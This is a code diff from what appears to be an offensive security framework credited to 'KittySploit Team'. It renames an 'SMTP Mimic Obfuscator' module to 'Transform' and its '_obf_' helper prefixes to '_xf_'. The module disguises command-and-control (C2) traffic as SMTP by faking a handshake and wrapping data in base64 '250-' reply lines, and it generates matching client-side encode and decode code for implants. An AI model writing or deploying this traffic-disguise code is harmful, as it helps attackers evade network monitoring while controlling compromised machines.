@@ -21,12 +21,12 @@ B64_LINE_LEN = 76
 CRLF = b"\r\n"
 
 
-class Module(Obfuscator):
+class Module(Transform):
 
     SUPPORTED_CLIENT_LANGUAGES = ["python"]
 
     __info__ = {
-        "name": "SMTP Mimic Obfuscator",
+        "name": "SMTP Mimic Transform",
         "description": "Simulates SMTP handshake (220/EHLO/250) then wraps C2 in SMTP-like base64 lines.",
         "author": "KittySploit Team",
         "version": "1.0.0",
@@ -106,17 +106,17 @@ class Module(Obfuscator):
         return b"".join(out)
 
     def generate_client_code(self, language: str) -> Optional[str]:
-        """Generate Python: send EHLO once, then _obf_encode (frame as 250- lines), _obf_decode (parse 250- lines)."""
+        """Generate Python: send EHLO once, then _xf_encode (frame as 250- lines), _xf_decode (parse 250- lines)."""
         if language != "python":
             return None
         ehlo_hex = SMTP_CLIENT_EHLO.hex()
         return (
-            "_obf_buf=bytearray()\n"
-            "_obf_b64_buf=bytearray()\n"
-            "_obf_ehlo=bytes.fromhex('" + ehlo_hex + "')\n"
-            "def _obf_send_handshake(sock):\n"
-            " sock.sendall(_obf_ehlo)\n"
-            "def _obf_encode(d):\n"
+            "_xf_buf=bytearray()\n"
+            "_xf_b64_buf=bytearray()\n"
+            "_xf_ehlo=bytes.fromhex('" + ehlo_hex + "')\n"
+            "def _xf_send_handshake(sock):\n"
+            " sock.sendall(_xf_ehlo)\n"
+            "def _xf_encode(d):\n"
             " import base64,struct\n"
             " if not d: return d\n"
             " L=struct.pack('>I',len(d)); b=base64.b64encode(L+d).decode('ascii')\n"
@@ -126,26 +126,26 @@ class Module(Obfuscator):
             "  p=b'250-' if i<len(b) else b'250 '\n"
             "  out.append(p+c.encode('ascii')+b'\\r\\n')\n"
             " return b''.join(out)\n"
-            "def _obf_decode(d):\n"
+            "def _xf_decode(d):\n"
             " import base64,struct\n"
-            " _obf_buf.extend(d)\n"
+            " _xf_buf.extend(d)\n"
             " out=[]\n"
             " while True:\n"
-            "  i=_obf_buf.find(b'\\r\\n')\n"
-            "  if i==-1: i=_obf_buf.find(b'\\n')\n"
+            "  i=_xf_buf.find(b'\\r\\n')\n"
+            "  if i==-1: i=_xf_buf.find(b'\\n')\n"
             "  if i==-1: break\n"
-            "  line=bytes(_obf_buf[:i+2 if _obf_buf[:i+2].endswith(b'\\r\\n') else i+1]); del _obf_buf[:len(line)]\n"
+            "  line=bytes(_xf_buf[:i+2 if _xf_buf[:i+2].endswith(b'\\r\\n') else i+1]); del _xf_buf[:len(line)]\n"
             "  line=line.strip()\n"
             "  if line.startswith(b'220 ') or line.startswith(b'EHLO') or line.startswith(b'HELO'): continue\n"
-            "  if line.startswith(b'250-'): _obf_b64_buf.extend(line[4:]); continue\n"
+            "  if line.startswith(b'250-'): _xf_b64_buf.extend(line[4:]); continue\n"
             "  if line.startswith(b'250 '):\n"
-            "   _obf_b64_buf.extend(line[4:])\n"
+            "   _xf_b64_buf.extend(line[4:])\n"
             "   try:\n"
-            "    raw=base64.b64decode(_obf_b64_buf.decode('ascii'))\n"
+            "    raw=base64.b64decode(_xf_b64_buf.decode('ascii'))\n"
             "    if len(raw)>=4:\n"
             "     ln=struct.unpack('>I',raw[:4])[0]\n"
             "     if ln<=len(raw)-4: out.append(raw[4:4+ln])\n"
             "   except: pass\n"
-            "   _obf_b64_buf.clear()\n"
+            "   _xf_b64_buf.clear()\n"
             " return b''.join(out)\n"
         )
